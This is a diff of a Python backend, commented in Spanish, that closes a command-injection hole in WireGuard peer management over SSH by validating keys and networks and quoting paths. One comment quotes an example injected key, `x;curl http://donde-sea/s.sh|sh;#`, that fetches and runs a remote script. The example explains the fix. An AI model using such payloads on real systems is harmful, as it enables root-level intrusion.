@@ -3,7 +3,9 @@ from sqlalchemy import case, func
 from sqlalchemy.orm import Session
 from typing import List, Optional
 import subprocess
+import ipaddress
 import re
+import shlex
 import socket
 import logging
 import base64
@@ -154,12 +156,88 @@ def wg_peer_status(pubkey: str, forzar: bool = False) -> Optional[dict]:
     return None
 
 
+# ── Lo que se le puede pasar a `wg set` ──────────────────────────────────────
+#
+# Esto no es cosmética ni validación de formulario: todo lo que entra aquí
+# termina dentro de una línea de comando que se ejecuta COMO ROOT en la VPS,
+# la máquina que guarda los túneles de todas las zonas y la llave con la que
+# se entra a cada MikroTik. Sin estas comprobaciones, una clave pública como
+#     x;curl http://donde-sea/s.sh|sh;#
+# no configura ningún peer: ejecuta ese comando en la VPS. Y la clave llega
+# como un parámetro de la petición, escrito por quien llama al endpoint.
+#
+# Por eso se valida aquí, en la función que arma el comando, y no (solo) en
+# el endpoint: así ningún camino nuevo que llame a wg_add_peer/wg_remove_peer
+# puede saltarse la comprobación sin darse cuenta.
+
+# Una clave pública de WireGuard son 32 bytes en base64: 43 caracteres del
+# alfabeto base64 y el '=' de relleno final. Nada más cabe.
+_WG_PUBKEY_RE = re.compile(r'^[A-Za-z0-9+/]{43}=$')
+
+
+def _validar_pubkey(pubkey: str) -> str:
+    limpio = (pubkey or "").strip()
+    if not _WG_PUBKEY_RE.match(limpio):
+        raise HTTPException(
+            status_code=400,
+            detail="La clave pública de WireGuard no tiene el formato correcto: son 44 "
+                   "caracteres en base64, los que imprime `wg genkey | wg pubkey` (o "
+                   "`/interface/wireguard print` en el MikroTik).",
+        )
+    return limpio
+
+
+def _validar_allowed_ips(allowed_ips: str) -> str:
+    """Las redes del peer, comprobadas una por una con ipaddress.
+
+    Devuelve la lista normalizada y sin espacios, que es como la espera
+    `wg set`. Normalizar de paso arregla un error fácil de cometer a mano:
+    192.168.80.1/24 se guarda como 192.168.80.0/24, que es lo que se quería
+    decir.
+    """
+    redes = []
+    for trozo in (allowed_ips or "").split(","):
+        trozo = trozo.strip()
+        if not trozo:
+            continue
+        try:
+            redes.append(str(ipaddress.ip_network(trozo, strict=False)))
+        except ValueError:
+            raise HTTPException(
+                status_code=400,
+                detail=f"«{trozo}» no es una red válida. Se esperaba algo como "
+                       "10.10.0.2/32 o 192.168.80.0/24.",
+            ) from None
+    if not redes:
+        raise HTTPException(
+            status_code=400,
+            detail="El peer necesita al menos una red en allowed-ips.",
+        )
+    return ",".join(redes)
+
+
+def _comentario_de_peer(comment: str) -> str:
+    """El comentario del bloque [Peer], en una sola línea.
+
+    Va en base64 hacia la VPS, así que no puede ejecutar nada; pero un nombre
+    de zona con un salto de línea partiría el bloque en dos y dejaría el
+    wg0.conf mal formado, que es su propia manera de romper el túnel.
+    """
+    return " ".join((comment or "").split())[:80]
+
+
 def wg_add_peer(pubkey: str, allowed_ips: str, comment: str = "") -> dict:
     """Agrega peer al wg0.conf de la VPS y lo aplica con wg set — todo por
     SSH, porque el backend corre en el servidor local, no en la VPS."""
+    pubkey = _validar_pubkey(pubkey)
+    allowed_ips = _validar_allowed_ips(allowed_ips)
+    comment = _comentario_de_peer(comment)
     conf_path = settings.WG_CONFIG_PATH
+    # Entre comillas para el shell remoto: la ruta sale de la configuración,
+    # no de la petición, pero un espacio en ella rompería el comando.
+    conf_q = shlex.quote(conf_path)
 
-    leido = _ssh_vps(f"cat {conf_path}")
+    leido = _ssh_vps(f"cat {conf_q}")
     if not leido["ok"]:
         return {"ok": False, "error": f"No se pudo leer {conf_path} en la VPS: {leido['output']}"}
     content = leido["output"]
@@ -180,13 +258,14 @@ def wg_add_peer(pubkey: str, allowed_ips: str, comment: str = "") -> dict:
     # Va codificado en base64 para no pelear con comillas/espacios al pasar
     # el bloque como una sola línea de comando remoto.
     b64_block = base64.b64encode(block.encode()).decode()
-    escrito = _ssh_vps(f"echo {b64_block} | base64 -d >> {conf_path}")
+    escrito = _ssh_vps(f"echo {b64_block} | base64 -d >> {conf_q}")
     if not escrito["ok"]:
         return {"ok": False, "error": f"Error escribiendo config en la VPS: {escrito['output']}"}
 
-    # Aplicar sin reiniciar
-    ips_clean = allowed_ips.replace(" ", "")
-    aplicado = _ssh_vps(f"wg set wg0 peer {pubkey} allowed-ips {ips_clean}")
+    # Aplicar sin reiniciar. pubkey y allowed_ips ya vienen validados arriba:
+    # son base64 de 44 caracteres y una lista de redes normalizada por
+    # ipaddress, así que no hay nada que el shell pueda interpretar.
+    aplicado = _ssh_vps(f"wg set wg0 peer {pubkey} allowed-ips {allowed_ips}")
     if not aplicado["ok"]:
         return {"ok": False, "error": f"wg set falló: {aplicado['output']}"}
     _invalidar_wg_cache()
@@ -196,9 +275,15 @@ def wg_add_peer(pubkey: str, allowed_ips: str, comment: str = "") -> dict:
 def wg_remove_peer(pubkey: str) -> dict:
     """Elimina peer del wg0.conf de la VPS y de la interfaz activa — por
     SSH, mismo motivo que wg_add_peer."""
+    # La clave sale de la base de datos y no de la petición, pero se vuelve a
+    # comprobar: si alguna vez entró una fila mal (una migración, una carga a
+    # mano, un peer dado de alta antes de que existiera esta validación), el
+    # borrado no debe ser el camino por el que se ejecute.
+    pubkey = _validar_pubkey(pubkey)
     conf_path = settings.WG_CONFIG_PATH
+    conf_q = shlex.quote(conf_path)
 
-    leido = _ssh_vps(f"cat {conf_path}")
+    leido = _ssh_vps(f"cat {conf_q}")
     if not leido["ok"]:
         return {"ok": False, "error": f"No se pudo leer {conf_path} en la VPS: {leido['output']}"}
     content = leido["output"]
@@ -212,7 +297,7 @@ def wg_remove_peer(pubkey: str) -> dict:
     new_content = "\n".join(new_sections)
 
     b64_content = base64.b64encode(new_content.encode()).decode()
-    escrito = _ssh_vps(f"echo {b64_content} | base64 -d > {conf_path}")
+    escrito = _ssh_vps(f"echo {b64_content} | base64 -d > {conf_q}")
     if not escrito["ok"]:
         return {"ok": False, "error": f"Error escribiendo config en la VPS: {escrito['output']}"}
 
@@ -579,6 +664,11 @@ def add_wg_peer(
             status_code=400,
             detail="Primero asigna una IP de WireGuard a la zona.",
         )
+
+    # Se comprueba antes de hablar con la VPS: así un dato mal escrito da un
+    # 400 inmediato en vez de un viaje de ida y vuelta por SSH, y la clave que
+    # se guarda abajo es exactamente la que se validó.
+    pubkey = _validar_pubkey(pubkey)
 
     allowed_ips = f"{zona.ip_wireguard}/32"
     if lan_network:
